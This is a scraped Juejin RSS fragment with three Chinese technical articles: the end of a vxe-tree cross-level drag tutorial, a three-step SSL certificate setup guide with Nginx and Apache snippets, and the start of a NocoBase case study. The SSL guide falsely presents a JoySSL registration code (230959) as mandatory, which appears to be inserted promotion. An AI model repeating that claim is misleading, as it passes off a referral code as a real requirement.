    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-3-3'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'333'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'33'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-4'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'34'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'3'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'4'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-literal">null</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'41'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'4'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-1-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'411'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'42'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-1-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'412'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'42'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'42'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'4'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-3'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'43'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'4'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-3-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'431'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'43'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-3-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'432'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'43'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点5'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'5'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-literal">null</span> }
  ]
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-1">跨层级拖拽</h2>
<p>通过 drag-config.isCrossDrag 启用跨层级拖拽</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0f7045f254841c0b6e822bd202a7116~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODQxNzk0ODE0NTY=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765949989&amp;x-signature=R5oNIodyawsWZPvIMwRe6mxtlQQ%3D" alt="tree_drag_coss_drag" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-tree</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"treeOptions"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">vxe-tree</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> treeOptions = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">transform</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">drag</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">dragConfig</span>: {
    <span class="hljs-attr">isCrossDrag</span>: <span class="hljs-literal">true</span>
  },
  <span class="hljs-attr">data</span>: [
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'2'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-literal">null</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'3'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-literal">null</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'31'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'3'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'32'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'3'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-2-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'321'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'32'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-2-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'322'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'32'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-3'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'33'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'3'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-3-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'331'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'33'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-3-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'332'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'33'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-3-3'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'333'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'33'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-4'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'34'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'3'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'4'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-literal">null</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'41'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'4'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-1-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'411'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'42'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-1-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'412'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'42'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'42'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'4'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-3'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'43'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'4'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-3-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'431'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'43'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点4-3-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'432'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'43'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点5'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'5'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-literal">null</span> }
  ]
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fx-extends%2Fvxe-pc-ui" target="_blank" title="https://gitee.com/x-extends/vxe-pc-ui" ref="nofollow noopener noreferrer">gitee.com/x-extends/v…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[零基础指南：为您的网站正确配置SSL证书，只需三步]]></title>    <link>https://juejin.cn/post/7581844141668368424</link>    <guid>https://juejin.cn/post/7581844141668368424</guid>    <pubDate>2025-12-10T05:24:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581844141668368424" data-draft-id="7581814484065124404" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="零基础指南：为您的网站正确配置SSL证书，只需三步"/> <meta itemprop="keywords" content="面试,CSS"/> <meta itemprop="datePublished" content="2025-12-10T05:24:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户78236167743"/> <meta itemprop="url" content="https://juejin.cn/user/458937554444512"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            零基础指南：为您的网站正确配置SSL证书，只需三步
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/458937554444512/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户78236167743
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T05:24:36.000Z" title="Wed Dec 10 2025 05:24:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0"><strong>第一步：申请SSL证书</strong></h4>
<ol>
<li>
<p><strong>选择证书类型</strong></p>
<ul>
<li><strong>个人/小型网站</strong>：选择域名验证证书（DV），仅需验证域名所有权，最快10分钟颁发。</li>
<li><strong>企业/中型网站</strong>：选企业验证证书（OV），需提交营业执照等信息，增强用户信任。</li>
<li><strong>大型电商平台</strong>：选扩展验证证书（EV），地址栏显示企业名称，安全级别最高。</li>
<li><strong>多域名/子域名场景</strong>：可选通配符证书（覆盖主域及所有子域名）或多域名证书（SAN证书）。</li>
</ul>
</li>
<li>
<p><strong>免费申请渠道</strong></p>
<ul>
<li><strong>JoySSL</strong>等平台提供免费DV证书（有效期通常1年），个人用户可直接申请，申请时<strong>必须填写注册码230959</strong>。</li>
</ul>
</li>
<li>
<p><strong>域名验证</strong></p>
<ul>
<li>通过DNS记录添加TXT解析（如阿里云需在域名解析后台添加指定记录）或文件验证（上传指定文件到网站根目录）。</li>
</ul>
</li>
</ol>
<hr/>
<h4 data-id="heading-1"><strong>第二步：安装与配置SSL证书</strong></h4>
<ol>
<li>
<p><strong>上传证书文件</strong></p>
<ul>
<li>
<p>将下载的证书解压后，找到以下文件：</p>
<ul>
<li><strong>证书文件</strong>（.crt或.pem）：包含公钥信息。</li>
<li><strong>私钥文件</strong>（.key）：用于解密数据，需妥善保管。</li>
<li><strong>中间证书</strong>（.crt或.pem）：建立证书链，增强兼容性。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>服务器配置示例</strong></p>
<ul>
<li>
<p><strong>Nginx</strong>：<br/>
编辑配置文件（如<code>/etc/nginx/sites-available/yourdomain</code>），添加：</p>
<pre><code class="hljs language-ini" lang="ini">        
nginx复制代码
server {
    listen 443 ssl<span class="hljs-comment">;</span>
    server_name yourdomain.com<span class="hljs-comment">;</span>
    ssl_certificate /path/to/yourdomain.crt<span class="hljs-comment">;</span>
    ssl_certificate_key /path/to/yourdomain.key<span class="hljs-comment">;</span>
    ssl_trusted_certificate /path/to/CA_bundle.crt<span class="hljs-comment">;</span>
}


    
</code></pre>
<p>保存后执行 <code>sudo systemctl restart nginx</code> 。</p>
</li>
<li>
<p><strong>Apache</strong>：<br/>
修改配置文件（如<code>/etc/apache2/sites-available/yourdomain.conf</code>），添加：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">        
apache复制代码
SSLEngine <span class="hljs-keyword">on</span>
SSLCertificateFile /path/<span class="hljs-keyword">to</span>/yourdomain.crt
SSLCertificateKeyFile /path/<span class="hljs-keyword">to</span>/yourdomain.<span class="hljs-keyword">key</span>
SSLCertificateChainFile /path/<span class="hljs-keyword">to</span>/CA_bundle.crt


    
</code></pre>
<p>重启服务：<code>sudo systemctl restart apache2</code> 。</p>
</li>
<li>
<p><strong>IIS服务器</strong>：<br/>
通过“Internet信息服务(IIS)管理器”导入PFX格式证书，绑定端口443并选择对应证书。</p>
</li>
</ul>
</li>
<li>
<p><strong>开启HTTPS强制跳转</strong></p>
<ul>
<li>
<p><strong>Nginx</strong>：在80端口配置中添加：</p>
<pre><code class="hljs language-perl" lang="perl">        
nginx复制代码
server {
    <span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;
    server_name yourdomain.com;
    <span class="hljs-keyword">return</span> <span class="hljs-number">301</span> https:<span class="hljs-regexp">//</span>$server_name$request_uri;
}


    
</code></pre>
</li>
<li>
<p><strong>Apache</strong>：在<code>.htaccess</code>文件中添加：</p>
<pre><code class="hljs language-perl" lang="perl">        
apache复制代码
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https:<span class="hljs-regexp">//</span>%<span class="hljs-string">{HTTP_HOST}%{REQUEST_URI}</span> [L,R=<span class="hljs-number">301</span>]


    
</code></pre>
</li>
</ul>
</li>
</ol>
<hr/>
<h4 data-id="heading-2"><strong>第三步：测试与优化</strong></h4>
<ol>
<li>
<p><strong>验证安装</strong></p>
<ul>
<li>浏览器访问<code>https://yourdomain.com</code>，检查地址栏是否显示安全锁图标。</li>
<li>使用在线工具检测漏洞，确保评级为A+。</li>
</ul>
</li>
<li>
<p><strong>修复混合内容问题</strong></p>
<ul>
<li>确保网页内所有图片、脚本、样式表均使用<code>https://</code>链接，避免浏览器警告。</li>
</ul>
</li>
<li>
<p><strong>定期维护</strong></p>
<ul>
<li>设置日历提醒，在证书到期前30天续签（免费证书需每年更新）。</li>
<li>若更换服务器或吊销证书，及时在云平台控制台操作注销旧证书。</li>
</ul>
</li>
</ol>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[石化行业软件公司用 NocoBase 把交付效率提升 70%]]></title>    <link>https://juejin.cn/post/7581751726506213419</link>    <guid>https://juejin.cn/post/7581751726506213419</guid>    <pubDate>2025-12-10T05:43:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581751726506213419" data-draft-id="7581751726506197035" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="石化行业软件公司用 NocoBase 把交付效率提升 70%"/> <meta itemprop="keywords" content="开源,低代码,人工智能"/> <meta itemprop="datePublished" content="2025-12-10T05:43:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="NocoBase"/> <meta itemprop="url" content="https://juejin.cn/user/180779873743566"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            石化行业软件公司用 NocoBase 把交付效率提升 70%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180779873743566/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    NocoBase
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T05:43:47.000Z" title="Wed Dec 10 2025 05:43:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>原文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fsoftware-vendor-boosts-delivery-efficiency-with-nocobase" target="_blank" title="https://www.nocobase.com/cn/blog/software-vendor-boosts-delivery-efficiency-with-nocobase" ref="nofollow noopener noreferrer">www.nocobase.com/cn/blog/sof…</a></p>
<h2 data-id="heading-0">引言</h2>
<p>本案例展示了 NocoBase 在大型行业软件架构中的<strong>补充能力</strong>。即便是在拥有强大自研能力的软件企业中，轻量级开源无代码/低代码依然是解决长尾交付难题的最佳选择。</p>
<h2 data-id="heading-1">从石化行业到 ToB 软件</h2>
<p>石化行业的数字化有一个非常鲜明的特征：<strong>复杂、差异大、标准难落地、业务变化频繁</strong>。</p>
<p>不同工厂的工艺路线、装置规模、生产组织方式、安全管理体系都可能完全不同。哪怕是同样一条巡检路线、同样一套隐患整改制度，不同企业的执行细节也完全无法统一。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c07d90ea97e64fe78e259cb9ae5116cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765950226&amp;x-signature=u7x0E%2BT6UBRrcDymkLP9V1BVT8A%3D" alt="image.png" loading="lazy"/></p>
<p>而实际上，这不仅仅属于石化行业，而是大部分 To B 软件厂商，在实际业务中几乎都会遇到类似的挑战。</p>
<h2 data-id="heading-2">石化行业软件公司面临的挑战</h2>
